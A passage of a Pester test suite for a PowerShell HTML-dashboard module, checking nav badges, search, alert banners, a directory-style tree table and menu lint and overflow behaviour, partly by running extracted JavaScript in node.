  run(['x'.repeat(200)], {}, 300),                                  // custom cap
  run([], {})                                                       // no data: header only
];
console.log(r.join(','));
'@
            $f = Join-Path ([IO.Path]::GetTempPath()) ('dhfit_' + [guid]::NewGuid().ToString('N') + '.js')
            try { Set-Content -LiteralPath $f -Value $js -Encoding utf8NoBOM; (& node $f 2>&1) -join "`n" | Should -Be '238,378,800,300,120,300,66' }
            finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
        }
    }
}

Describe 'v2.4.0 features - nav badges and search' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:export = {
            param([hashtable] $Dash = @{})
            $r = New-DhDashboard -Title 't' @Dash
            Add-DhTable -Report $r -TableId 'tb' -Title 'T' -NavPath 'A' -Data @([pscustomobject]@{ Name = 'x' })
            Add-DhFindings -Report $r -Id 'f' -Title 'F' -NavPath 'A' -Findings @(@{ Id = '1'; Title = 'Bad'; Severity = 'critical' })
            Export-DhTestHtml -Report $r
        }
        $script:plain = & $script:export
        $script:both  = & $script:export @{ NavBadge = $true; Search = $true }
    }

    Context 'Off by default (no change to existing reports)' {
        It 'emits no search box and no badge flag' {
            $script:plain | Should -Not -Match 'id="nav-search-input"'
            $script:plain | Should -Not -Match 'data-navbadge'
        }
        It 'stores the switches on the report' {
            $r = New-DhDashboard -Title 't' -NavBadge -Search
            $r.NavBadge | Should -BeTrue
            $r.Search | Should -BeTrue
            (New-DhDashboard -Title 't').NavBadge | Should -BeFalse
        }
    }

    Context '-NavBadge' {
        It 'flags the nav and builds the index from findings with a nav path, excluding OK' {
            $script:both | Should -Match 'data-navbadge="true"'
            $fn = Get-DhTestJsFunction -Html $script:both -Name 'buildNavSevIndex'
            $fn | Should -Match "b\.blockType !== 'findings'"
            $fn | Should -Match 'critical: 0, warning: 0, info: 0'
            $fn | Should -Not -Match "ok:"
            $fn | Should -Match 'for \(var i = 1; i <= p\.length; i\+\+\)'
        }
        It 'runs after every nav change and addresses sidebar items by path too' {
            (Get-DhTestJsFunction -Html $script:both -Name 'updateNavBadges') | Should -Match 'updateNavSeverity\(\)'
            $script:both | Should -Match 'a\.dataset\.navto = JSON\.stringify\(child\.path\)'
        }
    }

    Context '-Search' {
        It 'adds one combobox in the menu bar outside the re-rendered strip' {
            $script:both | Should -Match 'id="nav-search-input"'
            $script:both | Should -Match 'role="combobox"'
            $script:both | Should -Match 'id="nav-search-list" role="listbox"'
            $i = $script:both.IndexOf('id="nav-strips-top"'); $j = $script:both.IndexOf('id="nav-search"')
            $j | Should -BeGreaterThan $i
            $script:both.IndexOf('</div>', $i) | Should -BeLessThan $j   # the search box is a sibling, not inside the strip
        }
        It 'escapes every result, never touches the URL, and has no inline handlers' {
            $fn = Get-DhTestJsFunction -Html $script:both -Name 'initSearch'
            $fn | Should -Match 'esc\(r\.text\)'
            $fn | Should -Match 'esc\(r\.sub\)'
            $fn | Should -Not -Match 'location\.hash|URLState|history\.'
            $fn | Should -Not -Match '\son(click|keydown|input|change)\s*='
        }
        It 'uses the table filter''s own matcher and the single jump path' {
            $fn = Get-DhTestJsFunction -Html $script:both -Name 'initSearch'
            $fn | Should -Match '_matchText\(rows\[ri\], term, cols\)'
            $fn | Should -Match 'jumpToTable\(r\.id, current\)'
        }
        It 'scans in time slices and can be cancelled by newer input' {
            $fn = Get-DhTestJsFunction -Html $script:both -Name 'initSearch'
            $fn | Should -Match 'setTimeout\(slice, 0\)'
            $fn | Should -Match 'my !== token'
            $fn | Should -Match 'debounce|setTimeout\(function \(\) \{ run\(current\); \}, 200\)'
        }
        It 'is booted after the nav exists' {
            $script:both | Should -Match '(?s)initNav\(\);\s*initSearch\(\);'
        }
    }
}

Describe 'Alert banners follow the menu' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $r = New-DhDashboard -Title 't'
        Add-DhTable -Report $r -TableId 'ta' -Title 'A' -NavPath 'A' -Data @([pscustomobject]@{ x = 1 })
        Add-DhTable -Report $r -TableId 'tb' -Title 'B' -NavPath 'B' -Data @([pscustomobject]@{ x = 1 })
        Add-DhAlertBanner -Report $r -Id 'glob'   -Message 'g' -Severity info
        Add-DhAlertBanner -Report $r -Id 'exactA' -Message 'a' -Severity warning -NavPath 'A'
        Add-DhAlertBanner -Report $r -Id 'subB'   -Message 'b' -Severity critical -NavPath 'B' -NavScope Subtree
        Add-DhAlertBanner -Report $r -Id 'legB'   -Message 'l' -Severity ok -NavGroup 'B'
        $script:html = Export-DhTestHtml -Report $r
    }

    It 'exports a path and scope only for banners bound to a path' {
        $script:html | Should -Match '"id":"exactA"[^}]*"navPath":\["A"\],"navScope":"exact"'
        $script:html | Should -Match '"id":"subB"[^}]*"navPath":\["B"\],"navScope":"subtree"'
        $script:html | Should -Match '"id":"legB"[^}]*"navPath":\["B"\]'
        $script:html | Should -Not -Match '"id":"glob"[^}]*"navPath"'
    }
    It 'marks the banner as a nav section and hides it until its path matches' {
        $fn = Get-DhTestJsFunction -Html $script:html -Name 'renderAlerts'
        $fn | Should -Match "banner\.setAttribute\('data-navpath'"
        $fn | Should -Match 'navMatches\(banner'
        $script:html | Should -Match '\.alert-banner\[data-navpath\]:not\(\.panel-active\)'
    }
    It 'keeps a banner out of the menu tree' {
        (Get-DhTestJsFunction -Html $script:html -Name 'buildNavTree') | Should -Match "classList\.contains\('alert-banner'\)"
    }
}

Describe 'Menu order uses the own node only' {
    BeforeAll { . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1') }
    It 'applies -NavOrder to the item node, not to its ancestors (JS matches Get-DhNavTree)' {
        $r = New-DhDashboard -Title 't'
        Add-DhTable -Report $r -TableId 'a' -Title 'A' -NavPath 'One/x' -Data @([pscustomobject]@{ v = 1 })
        Add-DhTable -Report $r -TableId 'b' -Title 'B' -NavPath 'Two/y' -NavOrder 1 -Data @([pscustomobject]@{ v = 1 })
        $h = Export-DhTestHtml -Report $r
        (Get-DhTestJsFunction -Html $h -Name 'buildNavTree') | Should -Match 'i === p\.length - 1 && ord !== 0'
    }
}

Describe 'Footer totals follow the selected rows' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $r = New-DhDashboard -Title 't'
        Add-DhTable -Report $r -TableId 'tb' -Title 'T' -MultiSelect -Data @([pscustomobject]@{ n = 'a'; v = 1 }, [pscustomobject]@{ n = 'b'; v = 2 }) -Columns @(
            @{ Field = 'n'; Label = 'N'; Aggregate = 'count' }, @{ Field = 'v'; Label = 'V'; Aggregate = 'sum' })
        $script:html = Export-DhTestHtml -Report $r
    }
    It 'aggregates the selected rows that are still in the filtered set, otherwise every filtered row' {
        $fn = Get-DhTestJsFunction -Html $script:html -Name '_renderFoot'
        $fn | Should -Match 'this\.selected\.forEach'
        $fn | Should -Match 'var aggRows = selRows \|\| filtered'
        $fn | Should -Match 'aggRows\.length'
    }
    It 'refreshes the footer when a row is ticked or clicked in multi-select mode' {
        ([regex]::Matches($script:html, '_renderSelClearBtn\(\);(self|this)\._renderFoot\(\)')).Count | Should -Be 2
    }
}

Describe 'v2.5.0 features - tree table' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:root = Join-Path $PSScriptRoot '..'
        $script:rows = {
            @(
                @{ Id = 'ou'; Type = 'ou'; Label = 'HQ' }
                @{ Id = 'g1'; ParentId = 'ou'; Type = 'group'; Label = 'G1'; Flags = @('privileged'); Status = 'warning'; Properties = [ordered]@{ 'DN' = 'CN=G1'; 'Scope' = 'Global' } }
                @{ Id = 'g2'; ParentId = 'ou'; Type = 'group'; Label = 'G2'; Detail = 'More text' }
                @{ Id = 'u1'; ParentId = 'ou'; Type = 'user'; Label = 'U1' }
            )
        }
        $script:links = { @(@{ GroupId = 'g1'; MemberId = 'g2' }, @{ GroupId = 'g2'; MemberId = 'u1' }) }
    }

    Context 'Add-DhTreeTable' {
        It 'stores the block and exports it as treetable, with optional keys only when used' {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) -Memberships (& $script:links)
            $h = Export-DhTestHtml -Report $r
            $h | Should -Match '"blockType":"treetable"'
            $h | Should -Match '"links":\[\["g1","g2"\],\["g2","u1"\]\]'
            $h | Should -Match '"status":"warn"'
            $h | Should -Match '"flags":\["privileged"\]'
            $h | Should -Match '"props":\[\{"label":"DN","value":"CN=G1"\}'
            $h | Should -Match '"detail":\{'
            $h | Should -Match '"type":"user","label":"U1","status":""\}'
        }
        It 'keeps a single row and a single membership as arrays' {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows @(@{ Id = 'g'; Type = 'group'; Label = 'G' }) -Memberships @(@{ GroupId = 'g'; MemberId = 'g' })
            $b = $r.Blocks[0]
            $b.Rows.Count | Should -Be 1
            $b.Memberships.Count | Should -Be 1
            (Export-DhTestHtml -Report $r) | Should -Match '"links":\[\["g","g"\]\]'
        }
        It 'allows no memberships' {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows)
            (Export-DhTestHtml -Report $r) | Should -Match '"links":\[\]'
        }
        It 'throws on a bad row: <Name>' -ForEach @(
            @{ Name = 'duplicate Id';     Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A' }, @{ Id = 'a'; Type = 'ou'; Label = 'B' }); Pattern = '*duplicate row Id*' }
            @{ Name = 'missing Label';    Rows = @(@{ Id = 'a'; Type = 'ou' }); Pattern = "*non-empty 'Label'*" }
            @{ Name = 'unknown Type';     Rows = @(@{ Id = 'a'; Type = 'robot'; Label = 'A' }); Pattern = '*Type must be one of*' }
            @{ Name = 'unknown ParentId'; Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A'; ParentId = 'zz' }); Pattern = '*unknown ParentId*' }
            @{ Name = 'own parent';       Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A'; ParentId = 'a' }); Pattern = '*its own parent*' -replace 'its', 'be its' }
            @{ Name = 'parent loop';      Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A'; ParentId = 'b' }, @{ Id = 'b'; Type = 'ou'; Label = 'B'; ParentId = 'a' }); Pattern = '*ParentId chain loops*' }
            @{ Name = 'bad status';       Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A'; Status = 'purple' }); Pattern = '*Status must be*' }
            @{ Name = 'bad Properties';   Rows = @(@{ Id = 'a'; Type = 'ou'; Label = 'A'; Properties = 'text' }); Pattern = '*Properties must be a hashtable*' }
        ) {
            $r = New-DhDashboard -Title 't'
            { Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows $Rows } | Should -Throw $Pattern
        }
        It 'throws on a bad membership: <Name>' -ForEach @(
            @{ Name = 'unknown group';  Links = @(@{ GroupId = 'zz'; MemberId = 'u1' }); Pattern = "*GroupId 'zz' is not a row Id*" }
            @{ Name = 'unknown member'; Links = @(@{ GroupId = 'g1'; MemberId = 'zz' }); Pattern = "*MemberId 'zz' is not a row Id*" }
            @{ Name = 'wrong shape';    Links = @(@{ GroupId = 'g1' }); Pattern = '*must be @{ GroupId; MemberId }*' }
        ) {
            $r = New-DhDashboard -Title 't'
            { Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) -Memberships $Links } | Should -Throw $Pattern
        }
        It 'warns when a membership group is not a group, and drops duplicates' {
            $r = New-DhDashboard -Title 't'
            $w = Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) -Memberships @(@{ GroupId = 'ou'; MemberId = 'u1' }, @{ GroupId = 'g1'; MemberId = 'u1' }, @{ GroupId = 'g1'; MemberId = 'u1' }) 3>&1
            "$w" | Should -Match "GroupId 'ou' is a ou, not a group"
            $r.Blocks[0].Memberships.Count | Should -Be 2
        }
        It 'accepts a circular nesting (real directories have them)' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) -Memberships @(@{ GroupId = 'g1'; MemberId = 'g2' }, @{ GroupId = 'g2'; MemberId = 'g1' }) } | Should -Not -Throw
        }
        It 'warns above -MaxRows without throwing' {
            $r = New-DhDashboard -Title 't'
            $many = foreach ($i in 1..12) { @{ Id = "n$i"; Type = 'user'; Label = "N$i" } }
            "$(Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows $many -MaxRows 10 3>&1)" | Should -Match 'exceeds -MaxRows'
        }
        It 'rejects a duplicate block Id' {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows)
            { Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) } | Should -Throw '*already exists*'
        }
        It 'renders with escaping and without inline handlers' {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows)
            $h = Export-DhTestHtml -Report $r
            $fn = Get-DhTestJsFunction -Html $h -Name 'renderTreeTable'
            $fn | Should -Match 'esc\(r\.label\)'
            $fn | Should -Not -Match '\son(click|keydown|input|change)\s*='
            $h | Should -Match "case 'treetable':\s+renderTreeTable"
        }
    }

    Context 'Membership logic (run in node)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
        BeforeAll {
            $r = New-DhDashboard -Title 't'
            Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows (& $script:rows) -Memberships (& $script:links)
            $script:h = Export-DhTestHtml -Report $r
            $script:runNode = {
                param([string] $Body)
                $src = ('dhTtLinks', 'dhTtPaths', 'dhTtNested' | ForEach-Object { Get-DhTestJsFunction -Html $script:h -Name $_ }) -join "`n"
                $f = Join-Path ([IO.Path]::GetTempPath()) ('dhtt_' + [guid]::NewGuid().ToString('N') + '.js')
                try { Set-Content -LiteralPath $f -Value ($src + "`n" + $Body) -Encoding utf8NoBOM; (& node $f 2>&1) -join "`n" }
                finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
            }
        }
        It 'builds both directions from the pairs' {
            (& $script:runNode "const l = dhTtLinks([['g1','g2'],['g2','u1'],['g1','u1']]); console.log(JSON.stringify([l.membersOf.g1, l.memberOf.u1, l.memberOf.g1]));") | Should -Be '[["g2","u1"],["g2","g1"],null]'
        }
        It 'lists every path up and respects the cap' {
            $out = & $script:runNode @'
const l = dhTtLinks([['top1','mid'],['top2','mid'],['mid','u'],['top1','u']]);
const p = dhTtPaths(l.memberOf, 'u', 50).paths.map(x => x.join('>')).sort();
const c = dhTtPaths(l.memberOf, 'u', 1);
console.log(p.join('|') + ';' + c.paths.length + ',' + c.more);
'@
            $out | Should -Be 'u>mid>top1|u>mid>top2|u>top1;1,2'
        }
        It 'flags a circular nesting and still ends' {
            $out = & $script:runNode @'
const l = dhTtLinks([['a','b'],['b','a'],['b','u']]);
const e = dhTtPaths(l.memberOf, 'u', 50);
const t = { a: 'group', b: 'group', u: 'user' };
const n = dhTtNested(l.membersOf, t, 'a', 6);
console.log([e.circular, e.paths.length, n.map(x => x.id + (x.circular ? '!' : '')).join(',')].join(';'));
'@
            $out | Should -Be 'true;1;b,a!'
        }
        It 'lists only groups in the nested view and honours the depth cap' {
            $out = & $script:runNode @'
const l = dhTtLinks([['g0','g1'],['g1','g2'],['g2','g3'],['g3','u']]);
const t = { g0: 'group', g1: 'group', g2: 'group', g3: 'group', u: 'user' };
console.log(dhTtNested(l.membersOf, t, 'g0', 2).map(x => x.id).join(',') + ';' + dhTtNested(l.membersOf, t, 'g0', 9).map(x => x.id).join(','));
'@
            $out | Should -Be 'g1,g2;g1,g2,g3'
        }
    }

    Context 'Tooling knows the tree table' {
        It 'is mapped, listed and exported' {
            $root = $script:root
            (Get-Content (Join-Path $root 'DashHtml.Design\Private\DhSchema.ps1') -Raw) | Should -Match "treetable\s+= 'Add-DhTreeTable'"
            (Get-Content (Join-Path $root 'DashHtml.Design\Public\ConvertFrom-DhScript.ps1') -Raw) | Should -Match "'add-dhtreetable'='treetable'"
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                (Get-Content (Join-Path $root $f) -Raw) | Should -Match "'Add-DhTreeTable'" -Because $f
            }
            (Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw) | Should -Match "'Add-DhTreeTable'\s+= @\{"
            (Import-PowerShellDataFile (Join-Path $root 'DashHtml/DashHtml.psd1')).FunctionsToExport | Should -Contain 'Add-DhTreeTable'
        }
    }
}

Describe 'v2.5.0 menu features' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        # the nav model and lint are private to the module: load them here, as the nav suite does
        . (Join-Path $PSScriptRoot '../DashHtml/Private/Test-DhNavMatch.ps1')
        . (Join-Path $PSScriptRoot '../DashHtml/Private/Get-DhNavModel.ps1')
        . (Join-Path $PSScriptRoot '../DashHtml/Private/Test-DhNavLint.ps1')
        $script:root = Join-Path $PSScriptRoot '..'
        $script:newReport = {
            param([hashtable] $Dash = @{})
            $r = New-DhDashboard -Title 't' @Dash
            Add-DhHtmlBlock -Report $r -Id 'own'  -Title 'o' -Content 'x' -NavPath 'Storage'
            Add-DhHtmlBlock -Report $r -Id 'cap'  -Title 'c' -Content 'x' -NavPath 'Storage/Capacity'
            Add-DhHtmlBlock -Report $r -Id 'snap' -Title 's' -Content 'x' -NavPath 'Storage/Snapshots'
            Add-DhHtmlBlock -Report $r -Id 'net'  -Title 'n' -Content 'x' -NavPath 'Network'
            $r
        }
        $script:nodeRun = {
            param([string] $Html, [string[]] $Functions, [string] $Body)
            $src = ($Functions | ForEach-Object { Get-DhTestJsFunction -Html $Html -Name $_ }) -join "`n"
            $f = Join-Path ([IO.Path]::GetTempPath()) ('dhnav_' + [guid]::NewGuid().ToString('N') + '.js')
            try { Set-Content -LiteralPath $f -Value ($src + "`n" + $Body) -Encoding utf8NoBOM; (& node $f 2>&1) -join "`n" }
            finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
        }
    }

    Context '-NavAllLabel' {
        It 'matches everything at or below the parent for the reserved * segment (PowerShell)' {
            Test-DhNavMatch -DeclaredPath @('Storage') -SelectedPath @('Storage', '*') -Scope Exact   | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @('Storage', 'Capacity') -SelectedPath @('Storage', '*') -Scope Exact | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @('Storage', 'Capacity', 'Vols') -SelectedPath @('Storage', '*') -Scope Exact | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @('Network') -SelectedPath @('Storage', '*') -Scope Exact | Should -BeFalse
            Test-DhNavMatch -DeclaredPath @() -SelectedPath @('Storage', '*') -Scope Subtree | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @() -SelectedPath @('Storage', '*') -Scope Global  | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @('Storage') -SelectedPath @('Storage', 'Capacity', '*') -Scope Subtree | Should -BeTrue
            Test-DhNavMatch -DeclaredPath @('Storage') -SelectedPath @('Storage', 'Capacity', '*') -Scope Exact   | Should -BeFalse
            Test-DhNavMatch -DeclaredPath @('Storage') -SelectedPath @('*') -Scope Exact | Should -BeTrue
        }
        It 'rejects * as a path segment' {
            { ConvertFrom-DhNavPath 'Storage/*' } | Should -Throw "*reserved*"
        }
        It 'accepts a string or a hashtable, rejects other things, and emits the attribute only when used' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            $h | Should -Not -Match 'data-navall'
            $h = Export-DhTestHtml -Report (& $script:newReport @{ NavAllLabel = 'Everything' })
            $h | Should -Match 'data-navallall="Everything"'
            $h = Export-DhTestHtml -Report (& $script:newReport @{ NavAllLabel = @{ 'Storage' = 'All storage' } })
            $h | Should -Match 'data-navall="\[\{&quot;path&quot;:\[&quot;Storage&quot;\],&quot;label&quot;:&quot;All storage&quot;\}\]"'
            { New-DhDashboard -Title 't' -NavAllLabel 42 } | Should -Throw '*string or a hashtable*'
            { New-DhDashboard -Title 't' -NavAllLabel @{ 'A' = '' } } | Should -Throw '*non-empty label*'
        }
        It 'mirrors the matcher in the browser and never makes the All view the default' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{ NavAllLabel = 'All' })
            (Get-DhTestJsFunction -Html $h -Name 'navMatches') | Should -Match "path\[path\.length - 1\] === '\*'"
            (Get-DhTestJsFunction -Html $h -Name 'navAutoDescend') | Should -Match "k !== '\*'"
        }
        It 'matches the PowerShell truth table in node' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
            $h = Export-DhTestHtml -Report (& $script:newReport @{ NavAllLabel = 'All' })
            $cases = @(
                @(@('Storage'), 'exact', @('Storage', '*')), @(@('Storage', 'Capacity'), 'exact', @('Storage', '*')),
                @(@('Storage', 'Capacity', 'Vols'), 'exact', @('Storage', '*')), @(@('Network'), 'exact', @('Storage', '*')),
                @(@(), 'subtree', @('Storage', '*')), @(@(), 'global', @('Storage', '*')),
                @(@('Storage'), 'subtree', @('Storage', 'Capacity', '*')), @(@('Storage'), 'exact', @('Storage', 'Capacity', '*')),
                @(@('Storage'), 'exact', @('*')))
            $expected = foreach ($c in $cases) { Test-DhNavMatch -DeclaredPath $c[0] -SelectedPath $c[2] -Scope ((Get-Culture).TextInfo.ToTitleCase($c[1])) }
            $json = ConvertTo-Json -InputObject @($cases | ForEach-Object { , @($_[0], $_[1], $_[2]) }) -Compress -Depth 5
            $body = "const cases = $json; console.log(cases.map(c => navMatches({ dataset: { navpath: JSON.stringify(c[0]), navscope: c[1] } }, c[2])).join(','));"
            (& $script:nodeRun $h @('navPathOf', 'navMatches') $body) | Should -Be (($expected | ForEach-Object { $_.ToString().ToLower() }) -join ',')
        }
    }

    Context '-NavTree' {
        It 'validates and normalises the skeleton' {
            { New-DhDashboard -Title 't' -NavTree @('Storage') } | Should -Throw '*hashtable with a Path*'
            { New-DhDashboard -Title 't' -NavTree @(@{ Path = 'A' }, @{ Path = 'A' }) } | Should -Throw '*twice*'
            { New-DhDashboard -Title 't' -NavTree @(@{ Path = 'A'; Order = 'x' }) } | Should -Throw '*Order must be*'
            { New-DhDashboard -Title 't' -NavTree @(@{ Path = 'A/*' }) } | Should -Throw '*reserved*'
            $r = New-DhDashboard -Title 't' -NavTree @(@{ Path = 'A'; Label = 'Alpha'; Order = 2 })
            $r.NavTree.Count | Should -Be 1
            $r.NavTree[0].Label | Should -Be 'Alpha'
        }
        It 'emits the skeleton only when given, and the runtime applies labels, order and empty nodes' {
            (Export-DhTestHtml -Report (& $script:newReport @{})) | Should -Not -Match 'data-navtree'
            $h = Export-DhTestHtml -Report (& $script:newReport @{ NavTree = @(@{ Path = 'Network' }, @{ Path = 'Storage'; Label = 'Disks' }) })
            $h | Should -Match 'data-navtree="\[\{&quot;path&quot;:\[&quot;Network&quot;\]'
            (Get-DhTestJsFunction -Html $h -Name 'buildNavTree') | Should -Match '-100000 \+ si'
        }
        It 'puts skeleton order ahead of declaration order in the opening view' {
            $r = New-DhDashboard -Title 't' -NavTree @(@{ Path = 'Network' }, @{ Path = 'Storage' })
            Add-DhHtmlBlock -Report $r -Id 'a' -Title 'a' -Content 'x' -NavPath 'Storage'
            Add-DhHtmlBlock -Report $r -Id 'b' -Title 'b' -Content 'x' -NavPath 'Network'
            $tree = Get-DhNavTree -Report $r
            (Get-DhNavInitialPath -Tree $tree) | Should -Be @('Network')
        }
        It 'creates an empty node for a skeleton path with nothing on it' {
            $r = New-DhDashboard -Title 't' -NavTree @(@{ Path = 'Later/Soon' })
            Add-DhHtmlBlock -Report $r -Id 'a' -Title 'a' -Content 'x' -NavPath 'Storage'
            (Get-DhNavTree -Report $r).Children.Contains('Later') | Should -BeTrue
        }
    }

    Context 'Empty view' {
        It 'is drawn by the runtime as a status note that ignores banners and global items' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            $fn = Get-DhTestJsFunction -Html $h -Name 'updateEmptyView'
            $fn | Should -Match "setAttribute\('role', 'status'\)"
            $fn | Should -Match "classList\.contains\('alert-banner'\)"
            $fn | Should -Match "=== 'global'"
            (Get-DhTestJsFunction -Html $h -Name 'applyNav') | Should -Match 'updateEmptyView\(\)'
        }
    }

    Context '-StrictNav' {
        It 'is silent for a clean menu' {
            $r = & $script:newReport @{ StrictNav = $true }
            @(Test-DhNavLint -Report $r).Count | Should -Be 0
        }
        It 'flags <Name>' -ForEach @(
            @{ Name = 'a path deeper than 3 levels';   Path = 'A/B/C/D';        Scope = 'Exact';   Pattern = '*4 levels deep*' }
            @{ Name = 'names that differ only in case'; Path = 'storage';        Scope = 'Exact';   Pattern = "*differ only in case*" }
            @{ Name = 'names one letter apart';        Path = 'Storag';         Scope = 'Exact';   Pattern = '*one letter apart*' }
            @{ Name = 'a Subtree item with nothing below'; Path = 'Network';    Scope = 'Subtree'; Pattern = '*has no views below it*' }
        ) {
            $r = & $script:newReport @{ StrictNav = $true }
            Add-DhHtmlBlock -Report $r -Id 'extra' -Title 'e' -Content 'x' -NavPath $Path -NavScope $Scope
            ((Test-DhNavLint -Report $r) -join "`n") | Should -BeLike $Pattern
        }
        It 'flags labels that clash and a path that is not in -NavTree, and -NavTree nodes with nothing on them' {
            $r = New-DhDashboard -Title 't' -StrictNav -NavTree @(@{ Path = 'Storage' }, @{ Path = 'Empty' })
            Add-DhHtmlBlock -Report $r -Id 'a' -Title 'a' -Content 'x' -NavPath 'Storage'
            Add-DhHtmlBlock -Report $r -Id 'b' -Title 'b' -Content 'x' -NavPath 'Other'
            Add-DhHtmlBlock -Report $r -Id 'c' -Title 'c' -Content 'x' -NavPath 'Reports/Alpha' -NavLabel 'Same'
            Add-DhHtmlBlock -Report $r -Id 'd' -Title 'd' -Content 'x' -NavPath 'Reports/Beta' -NavLabel 'same'
            $m = (Test-DhNavLint -Report $r) -join "`n"
            $m | Should -BeLike "*'Other' (used by 'b') is not listed in -NavTree*"
            $m | Should -BeLike "*-NavTree node 'Empty' has no content*"
            $m | Should -BeLike "*both show as 'Same'*"
        }
        It 'flags a -NavAllLabel that names no group' {
            $r = & $script:newReport @{ StrictNav = $true; NavAllLabel = @{ 'Network' = 'All'; 'Storage' = 'All storage' } }
            ((Test-DhNavLint -Report $r) -join "`n") | Should -BeLike "*-NavAllLabel 'Network' names no group*"
        }
        It 'warns at export only with -StrictNav, and marks the page for the empty-view hint' {
            $r = & $script:newReport @{ StrictNav = $true }
            Add-DhHtmlBlock -Report $r -Id 'x' -Title 'x' -Content 'x' -NavPath 'Storag'
            $res = Export-DhTestHtml -Report $r -WithWarnings
            ($res.Warnings -join ' ') | Should -Match 'Nav lint'
            $res.Html | Should -Match 'data-navstrict="true"'
            $r2 = & $script:newReport @{}
            Add-DhHtmlBlock -Report $r2 -Id 'x' -Title 'x' -Content 'x' -NavPath 'Storag'
            ((Export-DhTestHtml -Report $r2 -WithWarnings).Warnings -join ' ') | Should -Not -Match 'Nav lint'
        }
        It 'computes edit distance' {
            Get-DhEditDistance 'Storage' 'Storag' | Should -Be 1
            Get-DhEditDistance 'abc' 'abc' | Should -Be 0
            Get-DhEditDistance 'kitten' 'sitting' | Should -Be 3
            Get-DhEditDistance '' 'ab' | Should -Be 2
        }
    }

    Context 'Overflow and keyboard' {
        It 'emits the wrap opt-out only for -NavOverflow Wrap' {
            # the attribute on <nav>; the CSS also names it in a selector (2.5.3)
            (Export-DhTestHtml -Report (& $script:newReport @{})) | Should -Not -Match '<nav[^>]*data-navoverflow'
            (Export-DhTestHtml -Report (& $script:newReport @{ NavOverflow = 'More' })) | Should -Not -Match '<nav[^>]*data-navoverflow'
            (Export-DhTestHtml -Report (& $script:newReport @{ NavOverflow = 'Wrap' })) | Should -Match '<nav[^>]*data-navoverflow="wrap"'
            { New-DhDashboard -Title 't' -NavOverflow Scroll } | Should -Throw
        }
        It 'fits chips into two rows with the selected one kept visible (node)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            $body = @'
const w = Array(20).fill(100);                                   // 20 chips of 100px in a 450px strip, gap 4
const none = dhNavFit(w, 450, 4, 2, 80, -1);
const act = dhNavFit(w, 450, 4, 2, 80, 17);
const small = dhNavFit([100, 100, 100], 450, 4, 2, 80, 1);
const wide = dhNavFit(Array(40).fill(60), 2000, 4, 2, 80, 39);
console.log([none.visible.length, none.overflow.length, act.visible.indexOf(17) !== -1, act.visible.length === none.visible.length,
             small.overflow.length, wide.visible.indexOf(39) !== -1, none.visible.concat(none.overflow).length].join(','));
'@
            (& $script:nodeRun $h @('dhNavFit') $body) | Should -Be '7,13,true,true,0,true,20'
        }
        It 'keeps the menu on one row: More after the first row, badges filled before the fit (2.5.3)' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            $h | Should -Match 'var DH_NAV_MAX_ROWS = 1;'
            $fit = Get-DhTestJsFunction -Html $h -Name 'dhNavFitStrip'
            $fit | Should -Match 'DH_NAV_MAX_ROWS, moreW, active'
            $fit | Should -Match 'paddingLeft'
            $strips = Get-DhTestJsFunction -Html $h -Name 'renderNavStrips'
            $strips.IndexOf('dhNavDecorate(inner)') | Should -BeGreaterThan -1
            $strips.IndexOf('dhNavDecorate(inner)') | Should -BeLessThan $strips.IndexOf('dhNavFitStrip(inner)')
            (Get-DhTestJsFunction -Html $h -Name 'updateNavBadges') | Should -Match 'dhNavRefitIfWrapped'
            # the top strip keeps its line: with flex-basis auto a long menu dropped onto a row of its own
            $h | Should -Match '\.nav-strip-top \{[^}]*flex: 1 1 0;'
            # -NavOverflow Wrap keeps the earlier layout
